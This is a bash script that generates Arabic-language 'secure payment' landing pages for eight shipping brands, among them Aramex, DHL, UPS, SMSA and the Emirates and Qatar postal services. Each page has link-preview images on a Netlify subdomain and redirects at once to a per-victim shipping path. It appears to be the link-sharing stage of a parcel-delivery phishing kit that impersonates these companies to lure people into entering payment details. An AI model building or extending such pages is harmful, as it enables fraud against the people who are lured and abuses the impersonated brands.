#!/bin/bash

# Generate static share pages for all companies

COMPANIES=(
  "aramex:أرامكس للشحن السريع:خدمات شحن عالمية"
  "dhl:DHL الشحن العالمي:الشبكة العالمية للشحن"
  "ups:UPS للشحن العالمي:حلول لوجستية متكاملة"
  "smsa:SMSA Express:الرائدة في الشحن السعودي"
  "empost:البريد الإماراتي:خدمات بريدية وشحن متميزة"
  "qpost:البريد القطري:خدمات بريدية احترافية"
  "naqel:ناقل إكسبريس:خدمات شحن متطورة"
  "zajil:زاجل للشحن:شحن سريع وموثوق"
)

for COMPANY_DATA in "${COMPANIES[@]}"; do
  IFS=':' read -r company name desc <<< "$COMPANY_DATA"
  
  cat > "${company}.html" << EOF
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>دفع آمن - ${name}</title>
    <meta name="description" content="${desc} - أكمل عملية الدفع بأمان تام">
    <meta property="og:type" content="website">
    <meta property="og:title" content="دفع آمن - ${name}">
    <meta property="og:description" content="${desc} - أكمل عملية الدفع بأمان تام">
    <meta property="og:image" content="https://melodic-squirrel-d354d7.netlify.app/og-${company}.jpg">
    <meta property="og:image:secure_url" content="https://melodic-squirrel-d354d7.netlify.app/og-${company}.jpg">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="https://melodic-squirrel-d354d7.netlify.app/og-${company}.jpg">
    <script>
        const params = new URLSearchParams(window.location.search);
        const id = params.get('id') || 'test';
        const country = params.get('country') || 'ae';
        const url = \\\`\\\${window.location.origin}/r/\\\${country}/shipping/\\\${id}?company=${company}\\\`;
        window.location.replace(url);
    </script>
</head>
<body style="margin:0;background:#667eea;color:white;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:system-ui">
    <div><div style="width:50px;height:50px;border:3px solid rgba(255,255,255,0.3);border-top:3px solid white;border-radius:50%;animation:s 1s linear infinite;margin:0 auto 15px"></div><h1>${name}</h1><p>جاري التحميل...</p></div>
    <style>@keyframes s{to{transform:rotate(360deg)}}</style>
</body>
</html>
EOF
  
  echo "Created ${company}.html"
done

echo "Done!"
